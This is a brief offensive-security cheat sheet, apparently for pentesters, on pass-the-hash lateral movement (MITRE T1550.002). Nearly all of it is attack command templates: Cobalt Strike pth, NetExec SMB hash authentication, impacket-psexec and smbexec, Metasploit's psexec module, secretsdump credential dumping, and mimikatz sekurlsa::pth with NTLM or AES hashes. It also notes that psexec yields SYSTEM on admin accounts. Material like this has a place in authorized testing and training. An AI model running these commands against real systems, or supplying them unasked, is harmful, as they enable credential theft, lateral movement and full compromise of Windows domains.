T1550.002
PSexec will always attempt to return as NT_AUTHORITY\SYSTEM on admin accounts.

(Cobalt Strike) PtH 
- Uses mimikatz sekurlsa::pth
```bash
pth <DOMAIN>\<USER> <HASH>
```
(NXC) PtH
```bash
nxc smb <IP> -u <USER> -d <DOMAIN> -H <HASH> 
```
(Psexec) PtH
```bash
impacket-psexec <USER>@<IP> -hashes <LM:NTLM>
```
(Psexec) User authentication
```bash
impacket-psexec <DOMAIN>/<USER>@<IP>
```
(smbexec) User authentication
```bash
smbexec <USER>:<PASS>@<IP>
```
(Metasploit) PtH
```bash
exploit/windows/smb/psexec
```
(Secretsdump) Dumping credentials using hashes
```bash
secretsdump <DOMAIN>/<USER>:@<IP> -hashes <HASH>
```
(Mimikatz) PtH
- /aes128 and /aes256 for other encryption hashes 
```bash
mimikatz.exe sekurlsa::pth /user:"<USER>" /domain:"<DOMAIN>" /ntlm:"<HASH>"
```